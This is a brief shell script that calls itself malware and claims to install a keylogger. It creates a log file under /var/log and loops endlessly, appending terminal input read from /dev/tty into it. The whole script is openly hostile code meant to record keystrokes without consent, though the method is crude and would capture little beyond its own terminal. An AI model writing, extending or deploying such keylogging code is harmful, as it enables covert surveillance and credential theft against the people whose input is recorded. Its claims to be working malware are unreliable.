#!/bin/sh

echo "Malware initialization..."

# Set up keylogging functionality
echo "Installing keylogger..."

echo "Creating log file..."
touch /var/log/keylog.txt

echo "Setting up keystroke recording..."

while true; do
    echo -n "$(cat /dev/tty)" >> /var/log/keylog.txt
done